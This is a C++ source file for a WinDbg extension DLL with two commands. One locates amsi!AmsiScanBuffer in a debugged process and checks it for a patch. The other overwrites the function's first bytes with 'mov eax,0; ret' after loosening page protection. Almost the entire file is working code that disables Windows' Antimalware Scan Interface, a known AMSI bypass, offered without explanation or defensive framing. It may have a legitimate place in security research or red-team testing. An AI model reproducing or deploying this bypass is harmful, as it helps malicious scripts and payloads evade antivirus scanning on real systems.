#include "pch.h"
#include <windows.h>
#include <dbgeng.h>
#include <stdio.h>

#pragma comment(lib, "DbgEng.lib")

IDebugClient* g_Client = nullptr;
IDebugControl* g_Control = nullptr;
IDebugSymbols* g_Symbols = nullptr;
IDebugDataSpaces* g_Data = nullptr;
IDebugSystemObjects* g_SysObj = nullptr;

#define RELEASE(p)    if(p){ (p)->Release(); (p) = nullptr; }

// Patch bytes: mov eax,0; ret
static BYTE patchBytes[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

void DbgPrintf(const char* format, ...) {
    if (!g_Control) return;
    char buffer[1024] = { 0 };
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer) - 1, format, args);
    va_end(args);
    buffer[sizeof(buffer) - 1] = '\0';
    g_Control->Output(DEBUG_OUTPUT_NORMAL, buffer);
}

bool ReadMemorySafe(ULONG64 addr, void* buf, ULONG size) {
    if (!g_Data) return false;
    ULONG bytesRead = 0;
    HRESULT hr = g_Data->ReadVirtual(addr, buf, size, &bytesRead);
    return SUCCEEDED(hr) && bytesRead == size;
}

bool WriteMemorySafe(ULONG64 addr, const void* buf, ULONG size, ULONG* outWritten) {
    if (!g_Data) return false;
    ULONG written = 0;
    HRESULT hr = g_Data->WriteVirtual(addr, const_cast<PVOID>(buf), size, &written);
    if (outWritten) *outWritten = written;
    return SUCCEEDED(hr) && written == size;
}

bool IsAmsiPatched(ULONG64 addr) {
    BYTE current[sizeof(patchBytes)] = { 0 };
    if (!ReadMemorySafe(addr, current, sizeof(current))) return false;
    return memcmp(current, patchBytes, sizeof(patchBytes)) == 0;
}

extern "C" __declspec(dllexport)
HRESULT CALLBACK DebugExtensionInitialize(PULONG Version, PULONG Flags) {
    *Version = DEBUG_EXTENSION_VERSION(1, 0);
    *Flags = 0;
    HRESULT hr = DebugCreate(__uuidof(IDebugClient), (void**)&g_Client);
    if (FAILED(hr)) return hr;
    hr = g_Client->QueryInterface(__uuidof(IDebugControl), (void**)&g_Control);
    if (FAILED(hr)) { RELEASE(g_Client); return hr; }
    hr = g_Client->QueryInterface(__uuidof(IDebugSymbols), (void**)&g_Symbols);
    if (FAILED(hr)) { RELEASE(g_Control); RELEASE(g_Client); return hr; }
    hr = g_Client->QueryInterface(__uuidof(IDebugDataSpaces), (void**)&g_Data);
    if (FAILED(hr)) { RELEASE(g_Symbols); RELEASE(g_Control); RELEASE(g_Client); return hr; }
    hr = g_Client->QueryInterface(__uuidof(IDebugSystemObjects), (void**)&g_SysObj);
    if (FAILED(hr)) { RELEASE(g_Data); RELEASE(g_Symbols); RELEASE(g_Control); RELEASE(g_Client); return hr; }
    return S_OK;
}

extern "C" __declspec(dllexport)
void CALLBACK DebugExtensionUninitialize(void) {
    RELEASE(g_SysObj);
    RELEASE(g_Data);
    RELEASE(g_Symbols);
    RELEASE(g_Control);
    RELEASE(g_Client);
}

extern "C" __declspec(dllexport)
void CALLBACK DebugExtensionNotify(ULONG Notify, ULONG64) {

}

// !checkamsi
extern "C" __declspec(dllexport)
HRESULT CALLBACK checkamsi(PDEBUG_CLIENT Client, PCSTR args) {
    UNREFERENCED_PARAMETER(Client);
    UNREFERENCED_PARAMETER(args);
    if (!g_Control || !g_Symbols || !g_Data) return E_FAIL;
    ULONG64 addr = 0;
    HRESULT hr = g_Symbols->GetOffsetByName("amsi!AmsiScanBuffer", &addr);
    if (FAILED(hr) || addr == 0) {
        DbgPrintf("[!] Could not resolve AmsiScanBuffer (0x%08x)\n", hr);
        return hr;
    }
    DbgPrintf("[*] AmsiScanBuffer located at 0x%llx\n", addr);
    if (IsAmsiPatched(addr)) {
        DbgPrintf("[!] Already patched.\n");
    }
    else {
        DbgPrintf("[+] Unpatched bytes: ");
        BYTE buf[sizeof(patchBytes)];
        ReadMemorySafe(addr, buf, sizeof(buf));
        for (ULONG i = 0; i < sizeof(buf); ++i) DbgPrintf("0x%02x ", buf[i]);
        DbgPrintf("\n");
    }
    return S_OK;
}

// !patchamsi
extern "C" __declspec(dllexport)
HRESULT CALLBACK patchamsi(PDEBUG_CLIENT Client, PCSTR args) {
    UNREFERENCED_PARAMETER(Client);
    UNREFERENCED_PARAMETER(args);
    if (!g_Control || !g_Symbols || !g_Data || !g_SysObj) return E_FAIL;

    ULONG64 addr = 0;
    HRESULT hr = g_Symbols->GetOffsetByName("amsi!AmsiScanBuffer", &addr);
    if (FAILED(hr) || addr == 0) {
        DbgPrintf("[!] Could not resolve AmsiScanBuffer (0x%08x)\n", hr);
        return hr;
    }
    DbgPrintf("[*] Patching AmsiScanBuffer at 0x%llx\n", addr);

    ULONG64 hProc64 = 0;
    hr = g_SysObj->GetCurrentProcessHandle(&hProc64);
    if (FAILED(hr) || hProc64 == 0) {
        DbgPrintf("[!] Failed to get process handle (0x%08x)\n", hr);
        return E_FAIL;
    }
    HANDLE hProc = (HANDLE)hProc64;

    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProc, (LPVOID)addr, sizeof(patchBytes), PAGE_EXECUTE_READWRITE, &oldProt)) {
        DbgPrintf("[!] VirtualProtectEx failed (err %u)\n", GetLastError());
        return E_FAIL;
    }

    ULONG written = 0;
    if (!WriteMemorySafe(addr, patchBytes, sizeof(patchBytes), &written)) {
        DbgPrintf("[!] WriteVirtual failed\n");
        VirtualProtectEx(hProc, (LPVOID)addr, sizeof(patchBytes), oldProt, &oldProt);
        return E_FAIL;
    }

    VirtualProtectEx(hProc, (LPVOID)addr, sizeof(patchBytes), oldProt, &oldProt);
    DbgPrintf("[+] Patch applied successfully.\n");
    return S_OK;
}
